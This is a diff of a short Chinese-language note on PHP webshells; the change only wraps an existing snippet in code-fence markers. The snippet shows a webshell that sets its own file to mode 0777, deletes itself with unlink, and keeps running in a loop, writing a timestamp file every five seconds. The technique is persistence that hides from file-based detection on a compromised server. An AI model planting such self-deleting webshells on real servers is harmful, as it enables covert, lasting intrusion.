@@ -11,6 +11,7 @@ php删除自身时借助的函数为
     unlink($_SERVER['SCRIPT_FILENAME']);
 unlink函数运行条件较为苛刻，该脚本要具备可执行权限、可修改文件权限时方能执行。
 简单的webshell脚本：
+``` php 
     <?php
         chmod($_SERVER['SCRIPT_FILENAME'], 0777);
         unlink($_SERVER['SCRIPT_FILENAME']);
@@ -24,6 +25,7 @@ unlink函数运行条件较为苛刻，该脚本要具备可执行权限、可�
         sleep(5);
         };
     ?>
+```
 test.txt中的代码如下：
     file_put_contents('printTime.txt','jweny '.time());
 webshell执行后，删除自身，并在该目录生成 printTime.txt，每五秒一次写入一次时间戳。
